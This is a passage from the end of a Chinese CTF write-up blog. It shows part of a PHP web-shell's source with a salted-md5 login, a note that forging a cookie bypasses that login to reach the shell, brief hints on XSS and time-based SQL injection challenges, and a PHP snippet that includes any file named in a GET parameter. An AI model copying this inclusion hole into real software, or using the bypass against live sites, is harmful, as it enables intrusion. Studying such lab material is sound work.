</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    p(&#39;&lt;p&gt;&lt;input class=&#34;bt&#34; name=&#34;&#39; . $name . &#39;&#34; id=&#34;&#39; . $name . &#39;&#34; type=&#34;submit&#34; value=&#34;Submit&#34;&gt;&lt;/p&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    p(&#39;&lt;/form&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function goback()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    global $self, $nowpath;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    p(&#39;&lt;form action=&#34;&#39; . $self . &#39;&#34; method=&#34;post&#34;&gt;&lt;input type=&#34;hidden&#34; name=&#34;action&#34; value=&#34;file&#34; /&gt;&lt;input type=&#34;hidden&#34; name=&#34;dir&#34; value=&#34;&#39; . $nowpath . &#39;&#34; /&gt;&lt;p&gt;&lt;input class=&#34;bt&#34; type=&#34;submit&#34; value=&#34;Go back...&#34;&gt;&lt;/p&gt;&lt;/form&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function formfoot()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    p(&#39;&lt;/form&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 728193099115dcaa67805a0776785b3a
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function encode_pass($pass)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $pass = md5(&#39;angel&#39; . $pass);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $pass = md5($pass . &#39;angel&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $pass = md5(&#39;angel&#39; . $pass . &#39;angel&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return $pass;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function pr($s)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    echo &#34;&lt;pre&gt;&#34; . print_r($s) . &#39;&lt;/pre&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">?&gt;
</span></span></span></code></pre></div><p>只需要构造应该cookie就能绕过登录，直接拿到写好的shell读flag</p>
<h2 id="web-10">Web 10</h2>
<p>ez xss</p>
<h2 id="web-09">Web 09</h2>
<p>ez include</p>
<h2 id="web-08">Web 08</h2>
<p>sql注入，时间盲注，sqlmap能出来</p>
<h2 id="文件包含绕过">文件包含绕过</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;./check.php&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>])){
</span></span><span style="display:flex;"><span>        $filename  <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;filename&#39;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span>($filename);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div>
    </article>

    



  </div>
</div>

  </main>
  <footer class="flex flex-none justify-center">
    <section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
  <div class="flex flex-row">
    
  
  
  
  
    <a href="https://twitter.com/FanBig03" target="_blank" title="Twitter" class="flex flex-row mr-2">
      <span class="hidden">Twitter</span>
      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-x" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M4 4l11.733 16h4.267l-11.733 -16z"></path>
   <path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772"></path>
</svg>
 </i>
    </a>
  
  
  
  
  
  
  
    <a href="https://github.com/FanBigFan/" target="_blank" title="Github" class="flex flex-row mr-2">
      <span class="hidden">Github</span>
      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path>
</svg>
 </i>
    </a>
  
  


  </div>
  <div class="grow"></div>
  <div class="flex flex-row">
    <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
   <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
   <path d="M14 9.75a3.016 3.016 0 0 0 -4.163 .173a2.993 2.993 0 0 0 0 4.154a3.016 3.016 0 0 0 4.163 .173"></path>
</svg>
</i> 2023 - 2024 FanBig
    
  </div>
  
</section>

  </footer>
  <script src="/main.js"></script>

<div class="hidden top-1 right-1" id="code-copy">
  <i class="h-6 w-6 block">
    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" />
  <path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" />
</svg>

  </i>
</div>
<div class="hidden top-1 right-1" id="code-copy-done">
  <i class="h-6 w-6 block">
    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M5 12l5 5l10 -10" />
</svg>

  </i>
</div><script src="/code-copy.js"></script>





</body>
</html>
